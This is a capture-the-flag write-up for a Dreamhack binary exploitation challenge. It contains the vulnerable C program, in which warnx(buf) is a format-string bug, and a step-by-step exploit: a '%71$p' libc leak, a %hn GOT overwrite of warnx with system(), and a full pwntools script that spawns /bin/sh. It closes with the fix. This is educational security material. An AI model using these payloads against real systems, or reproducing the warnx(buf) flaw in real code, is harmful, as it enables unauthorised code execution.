---
title: "[Dreamhack] string - Write up"
date: 2024-01-19 00:00:00 +0700
categories: [Dreamhack, Binary Exploitation]
tags: [pwn, format-string, got-overwrite, warnx, dreamhack]
author: datious
---
[Write up for dreamhack]__Challenge: **string** | Author: datious

string.c 
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    close(2);
    dup2(1, 2);

    signal(SIGALRM, alarm_handler);
    alarm(60);
}


void input(char *buf) {
	printf("Input: ");
	read(0, buf, 255);
}

void print(char *buf) {
	warnx(buf);
}

int main() {

	int idx;
	char buf[256];

	initialize();

	memset(buf, 0, sizeof(buf));

	while(1) {
		printf("1. Input\n");
		printf("2. Print\n");
		printf("3. Exit\n");
		printf("> ");

		scanf("%d", &idx);
		switch(idx) {
			case 1:
				input(buf);
				break;
			case 2:
				print(buf);
				break;
			default:
				break;
		}
	}
	return 0;
}

```

The vulnerability in this challenge is format string. You can see that in print() function.

# Let analyze format string vulnerability in print() function:
- The **warnx()** was declaired in #include **<err.h> library.**
- This have prototype likes ***void warnx(const char *fmt, ...);***
- **Warnx()** works like **fprintf(stderr, fmt, ...);**
- The example is **char *buf="AAAA"**, the warnx() will work like **warnx(buf)**.
-  If user types** "%x%x%x"** into the buf, **warnx() **will operate **fprintf(stderr, "%x %x %x %x");** -> format string vulnerability -> leak data in memory.

Now, let check protection of program by GDB.

![image](https://hackmd.io/_uploads/rykvU2-HGg.png)

My idea is overwrite GOT address.
Because the challenge provides with libc.so.6 so we can use format string vulnerability to leak libc address and find system() address for overwrite GOT.

#1 Leak libc address.
- I observed that on stack have a libc address located at offset 71.
- So I leaked it by **payload=f'%71$p'.encode()**

#2 Finding essential address.
- Offset from libc base to leak address is 0x18637.
- From that we can calculate these address
![image](https://hackmd.io/_uploads/SkPlK3-Hfg.png)
#3 Overwrite GOT by %n
- I divided system address into 2 parts: low and high
- Write each part into GOT address on stack by %hn (just write 2 bytes at a time).
- The GOT address I choosed is warnx because it really convenient for executing "/bin/sh".
```
payload=p32(warn)
payload+=p32(warn+2)
payload+=f'%{low-8}c%5$hn'.encode()
payload+=f'%{high-low}c%6$hn'.encode()
#offset 5 and 6
p.sendlineafter(b'Input: ',payload)
p.sendlineafter(b'> ',b'2')
``` 
-> This is my payload for overwriting GOT.

#4 Activate system("/bin/sh").
- Just typing "/bin/sh" and choose option 2 for activation.

My script for reference: 

```
#!/usr/bin/python3
from pwn import *
exe=ELF('./string_patched',checksec=False)
#p=remote("host3.dreamhack.games",21960)
p=process(exe.path)
libc=ELF('./libc.so.6')
context.terminal=['konsole','-e']
gdb.attach(p,gdbscript='''
	b*print+3
	b*input+24
	''')
	
p.sendlineafter(b'> ',b'1')
payload=f'%71$p'.encode()
p.sendlineafter(b'Input: ',payload)
p.sendlineafter(b'> ',b'2')
p.recvuntil(b'string_patched: ')
leak=int(p.recvline(),16)
libc.address=leak-0x18637
log.info("leak: "+hex(leak))
log.info("libc base: "+hex(libc.address))

#return to libc
#overwrite got printf
warn=exe.got["warnx"]
system=libc.sym["system"]

low=system&0xffff
high=(system>>16)&0xffff

binsh=next(libc.search("/bin/sh"))
log.info("warn: "+hex(warn))
log.info("system: "+hex(system))
log.info("/bin/sh: "+hex(binsh))
p.sendlineafter(b'> ',b'1')

payload=p32(warn)
payload+=p32(warn+2)
payload+=f'%{low-8}c%5$hn'.encode()
payload+=f'%{high-low}c%6$hn'.encode()
#offset 5 and 6
p.sendlineafter(b'Input: ',payload)
p.sendlineafter(b'> ',b'2')

#inject /bin/sh
p.sendlineafter(b'> ',b'1')
payload=b'/bin/sh'
p.sendlineafter(b'Input: ',payload)
p.sendlineafter(b'> ',b'2')

p.interactive()
```

# How to fix this vulnerability?
- This is a basic vulnerability. You just need to change warnx(buf); to warnx("%s", buf); 


Goodluck!!!